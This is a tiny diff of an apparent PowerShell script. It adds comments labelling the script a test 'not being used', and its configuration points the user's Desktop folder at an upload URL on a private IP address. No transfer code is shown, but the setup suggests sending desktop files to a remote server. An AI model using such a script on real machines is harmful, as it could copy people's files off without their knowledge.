@@ -1,3 +1,7 @@
+# Testing script 
+# not being used 
+
+
 # CONFIGURATION
 $DesktopPath = [Environment]::GetFolderPath("Desktop")
 $Url = "http://192.168.6.114:5000/upload"  # match server IP or domain
